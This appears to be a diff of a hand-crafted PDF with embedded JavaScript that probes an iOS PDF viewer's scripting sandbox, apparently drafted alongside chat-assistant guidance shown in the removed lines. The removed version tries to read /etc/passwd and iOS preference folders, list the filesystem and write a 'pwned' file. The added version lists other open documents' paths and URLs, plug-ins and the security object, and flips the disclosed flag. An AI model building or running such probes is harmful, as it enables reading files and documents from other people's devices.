@@ -1,12 +1,5 @@
-app.alert(JSON.stringify(Object.getOwnPropertyNames(app.fs)));
-```
-
-All the PA schemes saying `no throw` — did the app change at all after you clicked OK? Did it navigate, flicker, or did Image5 change? Even a brief app switch would confirm a scheme was handled.
-
-**Quickest next probe — enumerate `app.fs`:**
-```
 %PDF-1.7
-% app.fs Probe - iOS - March 2026
+% activeDocs + execDialog Probe - iOS - March 2026
 1 0 obj
 << /Type /Catalog
    /Pages 2 0 R
@@ -28,57 +21,69 @@ endobj
 
         var results = [];
 
-        // === 1. ENUMERATE app.fs ===
-        results.push("=== app.fs ===");
+        // === 1. ACTIVE DOCS - other open documents ===
+        results.push("=== ACTIVE DOCS ===");
         try {
-          var fsKeys = [];
-          for (var k in app.fs) {
-            fsKeys.push(k + ":" + typeof app.fs[k]);
+          var docs = app.activeDocs;
+          results.push("activeDocs type: " + typeof docs);
+          results.push("activeDocs length: " + (docs ? docs.length : "null"));
+          if (docs && docs.length > 0) {
+            for (var i = 0; i < docs.length; i++) {
+              try {
+                results.push("doc[" + i + "] path: " + docs[i].path);
+                results.push("doc[" + i + "] URL: " + docs[i].URL);
+                results.push("doc[" + i + "] title: " + docs[i].info.Title);
+              } catch(e) { results.push("doc[" + i + "]: " + e); }
+            }
           }
-          results.push(fsKeys.length ? fsKeys.join("\\n") : "no enumerable keys");
-        } catch(e) { results.push("fs enum: " + e); }
+        } catch(e) { results.push("activeDocs: " + e); }
 
-        // === 2. KNOWN app.fs METHODS ===
-        results.push("=== fs METHODS ===");
-        try { results.push("readFile: " + typeof app.fs.readFile); } catch(e) { results.push("readFile: " + e); }
-        try { results.push("writeFile: " + typeof app.fs.writeFile); } catch(e) { results.push("writeFile: " + e); }
-        try { results.push("deleteFile: " + typeof app.fs.deleteFile); } catch(e) { results.push("deleteFile: " + e); }
-        try { results.push("createFolder: " + typeof app.fs.createFolder); } catch(e) { results.push("createFolder: " + e); }
-        try { results.push("getFiles: " + typeof app.fs.getFiles); } catch(e) { results.push("getFiles: " + e); }
-        try { results.push("exists: " + typeof app.fs.exists); } catch(e) { results.push("exists: " + e); }
-
-        // === 3. TRY READING KNOWN iOS PATHS ===
-        results.push("=== fs READ ===");
+        // === 2. FULLSCREEN OBJECT (real app.fs) ===
+        results.push("=== FULLSCREEN ===");
         try {
-          var r1 = app.fs.readFile("/etc/passwd", "text");
-          results.push("passwd: " + (r1 ? r1.toString().slice(0,50) : "empty"));
-        } catch(e) { results.push("passwd: " + e); }
+          results.push("fs.isFullScreen: " + app.fs.isFullScreen);
+          results.push("fs type: " + app.fs.toString());
+        } catch(e) { results.push("fs: " + e); }
 
+        // === 3. EXEC DIALOG - custom native dialog ===
+        results.push("=== EXEC DIALOG ===");
         try {
-          var r2 = app.fs.readFile("/var/mobile/Library/Preferences/", "text");
-          results.push("prefs: " + (r2 ? r2.toString().slice(0,50) : "empty"));
-        } catch(e) { results.push("prefs: " + e); }
+          results.push("execDialog: " + typeof app.execDialog);
+        } catch(e) { results.push("execDialog: " + e); }
 
-        // === 4. TRY LISTING PATHS ===
-        results.push("=== fs LIST ===");
+        // === 4. PLUG-INS - reveals SDK components ===
+        results.push("=== PLUGINS ===");
         try {
-          var l1 = app.fs.getFiles("/");
-          results.push("root listing: " + JSON.stringify(l1).slice(0,100));
-        } catch(e) { results.push("root listing: " + e); }
+          var plugins = app.plugIns;
+          results.push("plugIns length: " + plugins.length);
+          for (var j = 0; j < plugins.length; j++) {
+            try { results.push("plugin[" + j + "]: " + plugins[j].name + " v" + plugins[j].version); }
+            catch(e) { results.push("plugin[" + j + "]: " + e); }
+          }
+        } catch(e) { results.push("plugIns: " + e); }
 
+        // === 5. SECURITY OBJECT ===
+        results.push("=== SECURITY ===");
         try {
-          var l2 = app.fs.getFiles("/var/mobile/");
-          results.push("mobile listing: " + JSON.stringify(l2).slice(0,100));
-        } catch(e) { results.push("mobile listing: " + e); }
+          results.push("security type: " + typeof security);
+          var secKeys = [];
+          for (var k in security) { secKeys.push(k + ":" + typeof security[k]); }
+          results.push("security keys: " + secKeys.join(", "));
+        } catch(e) { results.push("security: " + e); }
 
-        // === 5. WRITE TEST ===
-        results.push("=== fs WRITE ===");
+        // === 6. DISCLOSED FLAG ===
+        results.push("=== DISCLOSED ===");
         try {
-          app.fs.writeFile("/tmp/pa_test.txt", "pwned", "text");
-          results.push("write /tmp: ok");
-          var verify = app.fs.readFile("/tmp/pa_test.txt", "text");
-          results.push("read back: " + verify);
-        } catch(e) { results.push("write /tmp: " + e); }
+          this.disclosed = true;
+          var docs2 = app.activeDocs;
+          results.push("after disclose - activeDocs: " + (docs2 ? docs2.length : "null"));
+          if (docs2) {
+            for (var m = 0; m < docs2.length; m++) {
+              try { results.push("disclosed doc[" + m + "]: " + docs2[m].path); }
+              catch(e) { results.push("disclosed doc[" + m + "]: " + e); }
+            }
+          }
+        } catch(e) { results.push("disclosed: " + e); }
 
         app.alert(results.join("\\n"));
 
@@ -100,7 +105,7 @@ endobj
 5 0 obj
 << /Length 90 >>
 stream
-BT /F1 14 Tf 50 250 Td (app.fs Probe) Tj ET
+BT /F1 14 Tf 50 250 Td (activeDocs Probe) Tj ET
 BT /F1 12 Tf 50 220 Td (Check alert output) Tj ET
 endstream
 endobj
@@ -111,11 +116,11 @@ xref
 0000000015 00000 n 
 0000000075 00000 n 
 0000000135 00000 n 
-0000002400 00000 n 
-0000002570 00000 n 
+0000002600 00000 n 
+0000002760 00000 n 
 
 trailer
 << /Size 6 /Root 1 0 R >>
 startxref
-2660
+2850
 %%EOF
